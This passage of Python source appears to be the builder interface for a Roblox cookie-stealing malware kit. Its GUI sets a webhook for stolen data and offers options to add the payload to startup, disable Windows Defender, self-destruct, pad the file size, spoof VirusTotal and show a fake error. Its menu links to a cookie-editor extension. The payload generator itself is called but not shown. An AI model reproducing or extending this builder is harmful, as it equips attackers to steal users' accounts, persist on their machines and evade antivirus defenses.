        command=lambda: update_config("fake_error", fake_error_var.get())
    )
    fake_error_check.grid(row=6, column=0, sticky="w", padx=8, pady=4)

    add_startup_var = tk.BooleanVar()
    add_startup_check = customtkinter.CTkCheckBox(
        root, text="Add to Startup", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=add_startup_var,
        command=lambda: update_config("add_startup", add_startup_var.get())
    )
    add_startup_check.grid(row=6, column=1, sticky="w", padx=8, pady=4)

    disable_defender_var = tk.BooleanVar()
    disable_defender_check = customtkinter.CTkCheckBox(
        root, text="Disable Defender", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=disable_defender_var,
        command=lambda: update_config("disable_defender", disable_defender_var.get())
    )
    disable_defender_check.grid(row=7, column=0, sticky="w", padx=8, pady=4)

    self_destruct_var = tk.BooleanVar()
    self_destruct_check = customtkinter.CTkCheckBox(
        root, text="Self Destruct", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=self_destruct_var,
        command=lambda: update_config("self_destruct", self_destruct_var.get())
    )
    self_destruct_check.grid(row=7, column=1, sticky="w", padx=8, pady=4)

    file_pumper_var = tk.BooleanVar()
    file_pumper_check = customtkinter.CTkCheckBox(
        root, text="File Pumper", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=file_pumper_var,
        command=lambda: update_pumper_state()
    )
    file_pumper_check.grid(row=8, column=0, sticky="w", padx=8, pady=4)

    pump_size_var = tk.StringVar(value="10mb")
    pump_size_menu = customtkinter.CTkOptionMenu(
        root, width=120, height=28, values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", button_hover_color="#4B0000", button_color="#6B0000",
        variable=pump_size_var, command=lambda value: update_config("pump_size", value)
    )
    pump_size_menu.grid(row=8, column=0, sticky="w", padx=128, pady=4)

    spoof_virustotal_var = tk.BooleanVar()
    spoof_virustotal_check = customtkinter.CTkCheckBox(
        root, text="VirusTotal Spoofer", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=spoof_virustotal_var,
        command=lambda: update_config_and_pumper()
    )
    spoof_virustotal_check.grid(row=8, column=1, sticky="w", padx=8, pady=4)

    ping_var = tk.BooleanVar()
    ping_check = customtkinter.CTkCheckBox(
        root, text="Ping", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=ping_var,
        command=lambda: update_ping_state()
    )
    ping_check.grid(row=9, column=0, sticky="w", padx=8, pady=4)

    ping_type_var = tk.StringVar(value="Everyone")
    ping_type_menu = customtkinter.CTkOptionMenu(
        root, width=120, height=28, values=["Everyone", "Here"], corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", button_hover_color="#4B0000", button_color="#6B0000",
        variable=ping_type_var, command=lambda value: update_config("ping_type", value),
        state="disabled"
    )
    ping_type_menu.grid(row=9, column=0, sticky="w", padx=128, pady=4)

    anti_spam_var = tk.BooleanVar()
    anti_spam_check = customtkinter.CTkCheckBox(
        root, text="Anti Spam", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=anti_spam_var,
        command=lambda: update_config("anti_spam", anti_spam_var.get())
    )
    anti_spam_check.grid(row=9, column=1, sticky="w", padx=8, pady=4)

    build_button = customtkinter.CTkButton(
        root, width=180, height=28, text="Build", corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", cursor="hand2",
        command=lambda: build_action(),
        state="disabled"
    )
    build_button.grid(row=10, column=0, columnspan=2, pady=8)

    def build_action():
        output_name = output_entry.get().strip()
        reserved_names = {"CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9"}
        if not webhook_valid:
            messagebox.showerror("Error", "Cannot build: Webhook URL is invalid.")
            return
        if not output_name:
            messagebox.showerror("Error", "Output name cannot be empty.")
            return
        if ' ' in output_name or not re.match(r'^[a-zA-Z][a-zA-Z0-9_-]{1,50}$', output_name):
            messagebox.showerror("Error", "Output name must be 2-50 characters, start with a letter, and contain only alphanumeric, underscores, or hyphens (no spaces).")
            return
        if output_name.upper() in reserved_names:
            messagebox.showerror("Error", f"Output name '{output_name}' is a reserved Windows name.")
            return
        for after_id in after_ids[:]:
            try:
                root.after_cancel(after_id)
                after_ids.remove(after_id)
            except:
                pass
        build_button.configure(text="Building...", fg_color="#6B0000")
        root.update()
        global file_type
        file_type = file_type_var.get()
        generate_script(
            webhook_entry.get(), output_name,
            fake_error_var.get(), add_startup_var.get(),
            webhook_name_entry.get(), webhook_pfp_entry.get(),
            disable_defender_var.get(), self_destruct_var.get(),
            file_pumper_var.get(), pump_size_var.get(), anti_spam_var.get(),
            ping_var.get(), ping_type_var.get(), spoof_virustotal_var.get()
        )
        after_id = root.after(800, lambda: build_button.configure(text="Build", fg_color="#8B0000"))
        after_ids.append(after_id)

    def update_config(key, value):
        updated_dictionary[key] = value
        if key == "webhook":
            for after_id in after_ids[:]:
                try:
                    root.after_cancel(after_id)
                    after_ids.remove(after_id)
                except:
                    pass
            after_id = root.after(100, check_webhook_action)
            after_ids.append(after_id)

    def update_config_and_pumper():
        update_config("spoof_virustotal", spoof_virustotal_var.get())
        update_pumper_state()

    def update_pumper_state():
        file_pumper_check.configure(state="normal")
        pump_size_menu.configure(state="normal" if file_pumper_var.get() else "disabled")
        update_config("file_pumper", file_pumper_var.get())

    def update_ping_state():
        ping_type_menu.configure(state="normal" if ping_var.get() else "disabled")
        update_config("ping", ping_var.get())
        if ping_var.get():
            ping_type_var.set("Everyone")
            update_config("ping_type", "Everyone")
        else:
            ping_type_var.set("Everyone")

    def update_icon_state():
        state = "normal" if file_type_var.get() == "pyinstaller" else "disabled"
        icon_button.configure(state=state)
        if state == "disabled":
            global icon_path
            icon_path = ""

    def select_icon():
        global icon_path
        new_icon_path = filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")])
        if new_icon_path and new_icon_path.endswith(".ico") and os.path.exists(new_icon_path) and os.access(new_icon_path, os.R_OK):
            icon_path = new_icon_path
            icon_button.configure(text="Icon Added", fg_color="#6B0000")
            after_id = root.after(800, lambda: icon_button.configure(text="Browse", fg_color="#8B0000"))
            after_ids.append(after_id)
        elif new_icon_path:
            messagebox.showerror("Error", "Please select a valid, accessible .ico file")

    def update_build_state():
        output_name = output_entry.get().strip()
        valid_name = output_name and ' ' not in output_name
        build_button.configure(state="normal" if webhook_valid and valid_name else "disabled")

    def check_webhook_action():
        nonlocal webhook_valid
        try:
            is_valid, webhook_name = validate_webhook(webhook_entry.get())
            webhook_valid = is_valid
            webhook_status.configure(text_color="#00FF00" if is_valid else "red")
            if is_valid:
                updated_dictionary["webhook"] = webhook_entry.get()
                if webhook_name and not webhook_name_entry.get():
                    webhook_name_entry.delete(0, tk.END)
                    webhook_name_entry.insert(0, webhook_name)
            else:
                updated_dictionary["webhook"] = None
            update_build_state()
        except Exception as e:
            webhook_valid = False
            webhook_status.configure(text_color="red")
            updated_dictionary["webhook"] = None
            update_build_state()

    update_pumper_state()
    update_ping_state()
    update_icon_state()
    update_build_state()

    try:
        root.mainloop()
    finally:
        for i in range(10000):
            try:
                root.after_cancel(f"{i}update")
                root.after_cancel(f"{i}check_dpi_scaling")
                root.after_cancel(after_ids.pop(0) if after_ids else f"{i}")
            except:
                pass
        root.update()
        root.destroy()

def main():
    while True:
        try:
            main_menu()
            choice = input()
            if choice == "1":
                if os.path.exists("scripts/checker.py"):
                    os.system("start cmd /k python scripts/checker.py")
                    os.system("exit")
                else:
                    messagebox.showerror("Error", "Checker script not found at scripts/checker.py")
                    continue
            elif choice == "2":
                webbrowser.open("https://www.roblox.com/pl/users/147675/profile")
                webbrowser.open("https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm")
                show_cookie_instructions()
            elif choice == "3":
                create_builder_gui()
            elif choice == "0":
                sys.exit()
            else:
                continue
        except KeyboardInterrupt:
            continue

if __name__ == "__main__":
    main()
